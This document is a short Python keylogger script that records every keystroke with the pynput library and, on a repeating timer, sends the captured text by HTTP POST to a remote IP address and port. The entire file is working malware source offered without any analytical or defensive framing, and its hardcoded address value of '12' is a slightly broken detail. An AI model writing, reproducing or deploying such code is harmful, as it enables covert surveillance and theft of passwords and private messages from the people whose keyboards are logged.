#!/usr/bin/python3

import sys
import json
import threading
from pynput import keyboard
import requests

# Global Variables
text = ""
ip_address = "12"
port_number = str(sys.argv[2])
interval = int(sys.argv[3])

def send_post_req():
    try:
        payload = json.dumps({"keyboardData": text})
        response = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Couldn't complete request: {e}")
    finally:
        # Reschedule the function to run again after the specified time interval
        threading.Timer(interval, send_post_req).start()

def on_press(key):
    global text

    key_mappings = {
        keyboard.Key.enter: "\n",
        keyboard.Key.tab: "\t",
        keyboard.Key.space: " ",
    }

    if key in key_mappings:
        text += key_mappings[key]
    elif key == keyboard.Key.backspace:
        text = text[:-1] if text else text
    elif key == keyboard.Key.esc:
        return False
    elif key not in (keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        text += str(key).strip("'")

# Start the keyboard listener and the initial POST request
with keyboard.Listener(on_press=on_press) as listener:
    send_post_req()
    listener.join()
